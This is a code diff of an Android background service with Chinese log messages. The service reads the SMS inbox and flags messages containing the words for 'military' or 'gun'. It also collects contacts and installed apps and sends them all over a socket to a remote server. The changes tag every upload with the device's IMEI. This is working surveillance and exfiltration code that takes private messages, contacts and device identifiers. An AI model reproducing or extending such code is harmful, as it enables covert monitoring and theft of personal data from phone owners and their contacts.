@@ -27,8 +27,10 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.Socket;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.Date;
 import java.util.HashMap;
 import java.util.HashSet;
 import java.util.Iterator;
@@ -71,6 +73,7 @@ public class MyService extends Service {
             out.flush();
             Log.d("发送类型",type+" 发送成功");
 
+
             if(type != "keyword_message"){
                 send_data = data.toString();
                 out.write(send_data.getBytes());
@@ -88,12 +91,27 @@ public class MyService extends Service {
                 Thread.sleep(100);
 
                 Iterator iterator = dataj.keys();
+                boolean is_imeisend = false;
                 while (iterator.hasNext()){
-                    String key = iterator.next().toString();
-                    send_data = dataj.getString(key);
-                    Thread.sleep(100);
-                    out.write(send_data.getBytes());
-                    out.flush();
+                    if(is_imeisend){
+                        String key = iterator.next().toString();
+                        send_data = dataj.getString(key);
+                        Thread.sleep(100);
+                        out.write(send_data.getBytes());
+                        out.flush();
+                    }
+                    else {
+                        String key = iterator.next().toString();
+                        send_data = dataj.getString(key);
+
+                        Thread.sleep(100);
+                        JSONObject datatmp = new JSONObject();
+                        datatmp.put("IMEI",send_data);
+                        send_data = datatmp.toString();
+                        out.write(send_data.getBytes());
+                        out.flush();
+                        is_imeisend = true;
+                    }
                 }
                 Log.d("发送数据"," 发送成功");
             }
@@ -115,19 +133,8 @@ public class MyService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         Log.d("输出","元素2");
-        String[] permission = intent.getStringArrayExtra("permission");
+        final String[] permission = intent.getStringArrayExtra("permission");
         final List<String> perList = Arrays.asList(permission);
-
-        final JSONObject permissions = new JSONObject();
-        int i_p = 0;
-        try {
-            for (String p : permission){
-                permissions.put(i_p + "",p);
-                i_p ++;
-            }
-        }catch (Exception e){
-            e.printStackTrace();
-        }
 
 
         //  调试：输出权限信息
@@ -148,23 +155,45 @@ public class MyService extends Service {
                     Log.d("IMEI",IMEI);
                 }
 
+                final JSONObject permissions = new JSONObject();
+                int i_p = 0;
+                try {
+                    permissions.put("IMEI",IMEI);
+                    for (String p : permission){
+                        permissions.put(i_p + "",p);
+                        i_p ++;
+                    }
+                }catch (Exception e){
+                    e.printStackTrace();
+                }
+
+
                 //查询短信敏感字
                 JSONObject messages = new JSONObject();
+
 
                 if(perList.contains("短信权限")){
                     String[] projection = {"address","person","body","date","type"};
                     String address,person,body,date,type;
+                    Long dateLong;
                     Cursor cursorMessage = getContentResolver().query(SMS_INBOX,projection,null,null,null);
 
                     if(cursorMessage != null){
                        try {
                            int i_mes = 0;
+                           messages.put("IMEI",IMEI);
+
                            while (cursorMessage.moveToNext()) {
                                address = cursorMessage.getString(cursorMessage.getColumnIndex("address"));
                                person = cursorMessage.getString(cursorMessage.getColumnIndex("person"));
                                body = cursorMessage.getString(cursorMessage.getColumnIndex("body"));
-                               date = cursorMessage.getString(cursorMessage.getColumnIndex("date"));
+                               dateLong = cursorMessage.getLong(cursorMessage.getColumnIndex("date"));
                                type = cursorMessage.getString(cursorMessage.getColumnIndex("type"));
+
+                               Date date1 = new Date(dateLong);
+                               SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+                               date =dateFormat.format(date1);
+
 
                                if(body.contains("军") || body.contains("枪")){
                                    JSONObject message = new JSONObject();
@@ -197,6 +226,8 @@ public class MyService extends Service {
                     if(cursorContact != null){
                         try {
                             int i_con = 0;
+                            contacts.put("IMEI",IMEI);
+
                             while (cursorContact.moveToNext()){
                                 name = cursorContact.getString(cursorContact.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
 
@@ -230,6 +261,8 @@ public class MyService extends Service {
                 List<PackageInfo> packages = packageManager.getInstalledPackages(0);
                 try {
                     int i_app = 0;
+                    apps.put("IMEI",IMEI);
+
                     for(PackageInfo packageInfo : packages){
                         String packageName = packageInfo.applicationInfo.loadLabel(packageManager).toString();
                         if(appList.contains(packageName)){
@@ -242,8 +275,8 @@ public class MyService extends Service {
                 }
 
 
-
                 //查询GPS坐标
+
 
                 //Socket编程，向服务器传输信息
                 Log.d("Socket 编程","准备开启");
